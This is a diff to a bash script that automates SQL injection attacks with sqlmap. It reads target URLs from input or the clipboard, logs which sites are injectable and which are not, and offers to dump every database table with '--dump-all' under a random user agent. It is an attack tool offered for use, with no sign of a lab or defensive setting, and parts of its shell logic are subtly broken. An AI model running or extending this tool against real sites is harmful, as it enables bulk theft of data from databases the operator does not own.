@@ -61,6 +61,7 @@ while true; do
 			if [ -z "$url" ]; then
                 		url=$(xclip -selection c -o)
 		        fi
+
 	else
 		echo
 		tput smso;
@@ -93,6 +94,13 @@ while true; do
 			if [ -z "$url" ]; then
                 		url=$(xclip -selection c -o)
 		        fi
+             elif echo $url | grep -q $url ~/lsql.no; then
+		tput smso;
+		echo "Previous scan detected uninjectable url."
+		tput rmso;
+		echo -ne '\007'
+		sleep 2
+		exit 0
 	else
 		echo
 		tput smso;
@@ -107,7 +115,10 @@ echo "Threads:"
 read -r Threads
 	if [ -z "$Threads" ]; then
 		Threads=3
-		tput smso;  echo "Starting with 3 Threads. (Default)"; tput rmso
+		tput smso;
+  echo "Starting with 3 Threads." 
+tput rmso;
+
 	fi
 
 echo "Extra"
@@ -129,7 +140,7 @@ echo $url
 echo
 if  grep -q "back-end DBMS:" lsql.log; then
 now=$(date)
-	if grep -q "$url" ~/lsql.vul; then
+	if grep -q "$url" ~/.lsql.vul; then
 	tput smso;
 	echo "Previously added url!"
 	else
@@ -149,6 +160,7 @@ echo
 sqlmap --random-agent -o --batch --no-cast --exclude-sysdb --tables -u ""$url""
 else 
 echo
+echo "$url" >> ~/lsql.no
 tput smso;
 echo "No injection found."
 tput rmso;
@@ -156,9 +168,10 @@ exit 0
 fi
 
 ##Dump option##
-
+if grep -q "$url" ~/.lsql.vul; then
+	
 while true; do
-    read -p "Do you wish to dump the database?: (Y/n)" yn
+    read -p "Do you wish to dump the database?: Y/n)" yn
 	case $yn in
         [Y]* ) break;;
         [n]* ) exit;;
@@ -173,5 +186,9 @@ sleep 3
 
 sqlmap --random-agent -o --batch --no-cast --exclude-sysdb --dump-all --dump-format sqlite -u ""$url""
 
+
+else
+exit 0
 fi
+
 exit 0
